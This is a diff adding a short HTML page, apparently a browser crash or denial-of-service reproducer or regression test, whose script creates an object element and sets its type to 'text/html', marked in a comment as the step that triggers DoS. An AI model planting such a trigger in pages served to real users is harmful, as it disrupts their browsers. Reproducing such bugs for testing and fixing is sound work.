@@ -1,0 +1,11 @@
+<html>
+  <head>
+  </head>
+<body>
+    <script>
+        let o = document.body.appendChild(document.createElement('object'));
+        // application/json or application/pdf are valid values too
+        o.type = 'text/html' // <-- triggers DoS
+    </script>
+</body>
+</html>
